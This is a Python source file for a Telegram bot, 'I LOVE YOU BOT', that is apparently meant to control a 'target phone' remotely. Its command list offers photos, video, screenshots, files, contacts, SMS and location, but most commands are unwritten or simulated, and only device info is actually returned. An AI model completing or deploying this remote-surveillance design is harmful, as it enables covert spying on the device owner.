# telegram_control.py
import os
import time
import platform
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from config import BOT_TOKEN, CHAT_ID, PASSWORD, PERMISSION_LINK, PERMISSION_GRANTED

# Initialize bot
app = Application.builder().token(BOT_TOKEN).build()
bot = Bot(token=BOT_TOKEN)

def check_permission():
    if not PERMISSION_GRANTED:
        print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
        return False
    return True

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("❌ Unauthorized user.")
        return
    await update.message.reply_text("💖 I LOVE YOU BOT is active!")
    await update.message.reply_text("Use /help to see commands.")

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    commands = """
📸 /photo - Take a photo
🎥 /video - Record a video
🖼️ /screenshot - Capture screenshot
📂 /files - List files
📞 /contacts - Get contacts
💬 /sms - Send SMS (if allowed)
📡 /location - Get location
🔊 /volume - Control volume
🔒 /lock - Lock screen
⌨️ /type - Auto type text
📱 /info - Device info
🔋 /battery - Battery status
🌐 /network - Network status
"""
    await update.message.reply_text(commands)

# Example command: Photo
async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text("📸 Photo captured! (simulation)")

# Example command: Device info
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    info_text = f"""
Device: {platform.node()}
System: {platform.system()} {platform.release()}
Platform: {platform.platform()}
"""
    await update.message.reply_text(info_text)

# Register handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("photo", photo))
app.add_handler(CommandHandler("info", info))
# Add other commands similarly

# Run the bot
print("💖 I LOVE YOU BOT is running...")
app.run_polling()
